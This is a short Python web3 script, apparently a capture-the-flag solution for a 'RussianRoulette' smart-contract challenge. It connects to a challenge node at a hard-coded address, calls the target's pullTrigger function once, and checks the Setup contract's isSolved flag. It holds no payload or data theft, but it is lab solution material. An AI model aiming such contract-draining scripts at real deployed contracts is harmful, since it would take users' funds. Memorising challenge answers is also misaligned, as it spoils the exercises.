#!/usr/bin/env python3
from web3 import Web3
import json

w3 = Web3(Web3.HTTPProvider('http://83.136.252.194:39045'))
print(w3.is_connected())

setup_address = '0x46b54Bb492A6AAC9A5A6cBceDb618Dc2058aD2be'
setupabi = [
	{
		"inputs": [],
		"stateMutability": "payable",
		"type": "constructor"
	},
	{
		"inputs": [],
		"name": "isSolved",
		"outputs": [
			{
				"internalType": "bool",
				"name": "",
				"type": "bool"
			}
		],
		"stateMutability": "view",
		"type": "function"
	},
	{
		"inputs": [],
		"name": "TARGET",
		"outputs": [
			{
				"internalType": "contract RussianRoulette",
				"name": "",
				"type": "address"
			}
		],
		"stateMutability": "view",
		"type": "function"
	}
]

target_address = '0x3deB684224733844A567cA8dc514AFef426D14ec'
targetabi = [
    {
		"inputs": [],
		"stateMutability": "payable",
		"type": "constructor"
	},
	{
		"inputs": [
			{
				"internalType": "string",
				"name": "memory",
				"type": "string"
			}
		],
		"name": "pullTrigger",
		"outputs": [],
		"stateMutability": "payable",
		"type": "function"
	},
	{
		"inputs": [],
		"name": "memory",
		"outputs": [
			{
				"internalType": "string",
				"name": "",
				"type": "string"
			}
		],
		"stateMutability": "view",
		"type": "function"
	}
]

contract_target = w3.eth.contract(address=target_address, abi=targetabi)
pullTrigger = contract_target.functions.pullTrigger("1").transact()

contract_setup = w3.eth.contract(address=setup_address, abi=setupabi)
isSolved = contract_setup.functions.isSolved().call()

print(isSolved)